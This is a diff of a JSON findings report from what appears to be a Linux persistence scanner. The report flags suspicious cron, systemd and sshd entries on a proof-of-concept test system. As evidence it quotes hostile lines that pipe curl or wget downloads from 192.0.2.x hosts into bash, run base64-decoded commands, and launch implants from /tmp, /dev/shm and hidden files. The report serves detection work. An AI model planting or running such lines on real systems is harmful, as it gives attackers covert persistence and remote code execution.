@@ -1,10 +1,91 @@
-[
-    {
-        "type": "cron",
-        "severity": "HIGH",
-        "file": "/etc/crontab",
-        "line": 23,
-        "content": "* * * * * /tmp/malware.sh",
-        "reason": "execution from /tmp/"
-    }
-]
+{
+    "generated_at": "2026-06-09T13:01:31.836783+00:00",
+    "total_findings": 10,
+    "severity_counts": {
+        "HIGH": 9,
+        "MEDIUM": 0,
+        "LOW": 1
+    },
+    "findings": [
+        {
+            "type": "cron",
+            "severity": "HIGH",
+            "file": "/etc/crontab",
+            "line": 23,
+            "content": "* * * * * /tmp/malware.sh",
+            "reason": "execution from /tmp/"
+        },
+        {
+            "type": "cron",
+            "severity": "HIGH",
+            "file": "/etc/cron.d/poc-test",
+            "line": 14,
+            "content": "* * * * * root /tmp/poc_beacon.sh",
+            "reason": "execution from /tmp/"
+        },
+        {
+            "type": "cron",
+            "severity": "HIGH",
+            "file": "/etc/cron.d/poc-test",
+            "line": 20,
+            "content": "*/5 * * * * nobody curl http://192.0.2.1/update.sh | bash",
+            "reason": "download and execute via curl"
+        },
+        {
+            "type": "cron",
+            "severity": "HIGH",
+            "file": "/etc/cron.d/poc-test",
+            "line": 25,
+            "content": "@hourly www-data curl -s http://192.0.2.99/check | sh",
+            "reason": "download and execute via curl"
+        },
+        {
+            "type": "cron",
+            "severity": "HIGH",
+            "file": "/etc/cron.d/poc-test",
+            "line": 30,
+            "content": "0 3 * * * root wget http://192.0.2.1/payload.sh | bash",
+            "reason": "download and execute via wget"
+        },
+        {
+            "type": "cron",
+            "severity": "HIGH",
+            "file": "/etc/cron.d/poc-test",
+            "line": 36,
+            "content": "*/10 * * * * root echo cG9j | base64 -d | bash",
+            "reason": "base64 decode and execute"
+        },
+        {
+            "type": "cron",
+            "severity": "HIGH",
+            "file": "/etc/cron.d/poc-test",
+            "line": 42,
+            "content": "@reboot root /dev/shm/implant",
+            "reason": "execution from /dev/shm/"
+        },
+        {
+            "type": "cron",
+            "severity": "HIGH",
+            "file": "/etc/cron.d/poc-test",
+            "line": 47,
+            "content": "0 0 * * 0 root /var/tmp/.hidden_updater",
+            "reason": "execution from /var/tmp/"
+        },
+        {
+            "type": "systemd",
+            "severity": "HIGH",
+            "file": "/etc/systemd/system/backdoor.service",
+            "field": "ExecStart",
+            "content": "/bin/bash -c \"touch /tmp/pwned\"",
+            "reason": "execution from /tmp/"
+        },
+        {
+            "type": "ssh_config",
+            "severity": "LOW",
+            "file": "/etc/ssh/sshd_config",
+            "line": 92,
+            "content": "X11Forwarding yes",
+            "reason": "dangerous sshd setting: X11Forwarding yes"
+        }
+    ]
+}
